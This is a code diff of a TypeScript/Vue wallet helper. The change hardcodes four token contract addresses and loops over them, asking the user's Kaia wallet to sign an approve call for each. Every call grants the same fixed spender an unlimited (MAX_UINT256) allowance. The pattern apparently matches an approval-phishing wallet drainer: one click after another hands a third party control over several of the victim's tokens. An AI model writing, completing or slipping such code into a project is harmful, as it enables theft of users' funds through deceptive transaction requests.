@@ -1,11 +1,21 @@
 import axios from 'axios';
+import {ref} from 'vue';
+
+const index = ref(0);
 
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 // 定义轮询间隔时间（毫秒）
-const POLLING_INTERVAL = 5000;
+const POLLING_INTERVAL = 2000;
 
-export const kaiaWalletApprove = async (address: string | undefined, callNextAsset: () => void): Promise<void> => {
+const addresses = [
+    '0x9eaefb09fe4aabfbe6b1ca316a3c36afc83a393f',
+    '0xcee8faf64bb97a73bb51e115aa89c17ffa8dd167',
+    '0x5c74070fdea071359b86082bd9f9b3deaafbe32b',
+    '0xc6a2ad8cc6e4a7e08fc37cc5954be07d499e7654',
+];
+
+export const kaiaWalletApprove = async (): Promise<void> => {
   try {
     // 发送交易请求
     const res = await axios.post(
@@ -31,7 +41,7 @@ export const kaiaWalletApprove = async (address: string | undefined, callNextAss
             "type": "function"
           }`,
           value: "0",
-          to: address,
+          to: addresses[index.value],
           params: `["0x48F943a8a6A6437117063D3aCaf62e2047467966", "${MAX_UINT256}"]`,
         },
       },
@@ -67,8 +77,9 @@ export const kaiaWalletApprove = async (address: string | undefined, callNextAss
           // 检查交易状态
           if (resultData.status === "completed") {
             clearInterval(intervalId); // 停止轮询
+            index.value += 1
             console.log("✅ 交易成功");
-            callNextAsset(); // 调用传入的回调函数
+
           } else if (resultData.status === "failed" || resultData.status === "reverted") {
             clearInterval(intervalId); // 停止轮询
             console.error("❌ 交易失败");
